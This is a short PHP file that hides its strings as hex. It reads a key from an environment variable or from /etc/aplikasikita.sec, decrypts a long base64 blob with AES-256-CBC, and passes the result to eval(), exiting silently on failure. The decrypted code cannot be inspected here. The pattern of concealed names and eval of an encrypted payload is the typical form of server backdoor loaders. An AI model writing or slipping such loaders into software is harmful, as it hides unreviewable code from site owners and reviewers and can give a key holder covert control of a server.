<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Ljj07z7I1i9umd889utxGg==');

$c=base64_decode(

'PuBdYPy2/HyyIOyx4vgdFmIztLr1MxKhYJ+uP8YP0RzDvxMdYSSvZKJ+IB6NAPrhc7MNE+MZMGaU' .
'yTXKKPm1gSM8QrgvBqGiqNUTjCZuMzgX0nIRMuoE1eIxnmsmsWHTXfU23MxC7mIH8t6NEPT6kw4U' .
'lvdIVRrwkkbscZn5+bKi2LYVREujzCRccinSlEoUmroX38AiXY3nT1QCNh8FII0hYGf8w0VvYqN5' .
't0dks4Tzfd4coHjpJFtoEzFykXQeztuhRPNTDcYDLgYXlgptTUg29dGhnZI12JXTspvMeYSKd7tF' .
'ut0dxIAEfQjnXA3WxRQ5nRqIKmDgQnWpSHLR9qAycX//7EI8iGKnW3l8tORbS1EQpk1oniDUmFZx' .
'qVozjv16k7/St8r3v7PJAOI4ccCS4yz1WxwkgzJqSZQWg0aYhWCsY9Hh68w9b3g8LysEPgtPfIo0' .
'dVuH+aOmoPP/9Tj20LcVYmAoe5ITq3PdNxIrZfVEyGfAcPBb5CvEcAomZ3xamf7eeNs4fVaIZWzx' .
'4CsTZ6ClHOLew+N8bJYqevTU+5zTaS8fPKkx0Y24bq3vES/lGG1noyyRLIELpjJSSwfUS0Kp+9fa' .
'T3asLvvBq+Q+Wev6dNea5dXHoWIP5uaXTCIpdssg5s3EfgcweeiXCkbxaskecsIGD6ALPOPIEJcw' .
'uQDUxNhOjMjmxhkU/kAwxbhjc1ARXJ/4r389BV6j2/tzzyd4IsmLZoNLTCjJZmbvziBQYnor7JKT' .
'UAhQvQI2Mk8PqMuNDPbmkKFel9ce7yVsWEY4D/HbON3gntxEt2xXStOaqkzMWsFBGHIrh3iBx3fB' .
'JEW8HVjJ0ckwZQqMaPGYYDSDHaLh28gTTV20A24l/oMEsxQPZF1L0kZKBt0Ys4r9DNDJxLZyoDtD' .
'maLIjFG+WGd+ZH1lgHMPg9mqv5diu3zrC3o8fnuIbG00kkXcgh5yNso43Ewqy53B21mrn9bcbLPq' .
'IyivCQUbBSqQ7M237m+0f//t32LFTG8a921iQxRwSov98hWbJQS5ZydK+3r2WPhnvGlNB0aHTDzw' .
'dZYJkEdBmn1RwGK4T05DmJi4grdIFwBjLWiHkrr41mCe+ErSQ5jz2hedbhif+YBz9avLQnH2XZuB' .
'HNhmqVYibVXS80LPpERn1FnFl3TH/iekY+f5D/bnxN6Ix5TPjatQfI514whbnrhvLRphUJU+ZkLG' .
'kUNeeF/KMi8vuE7gi2gGDiXYUIz6RaON7WHFlQKTZq3oGqE8D8s4n0y3KfGrWBmomwcEJlsa/tzL' .
'cRUi1XobKCUCSFbYy+HRN3LEFMy42b2VbrV9+75hMHOZoS6xZgdYYyzzlfFgak0bPPyNNMApYA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

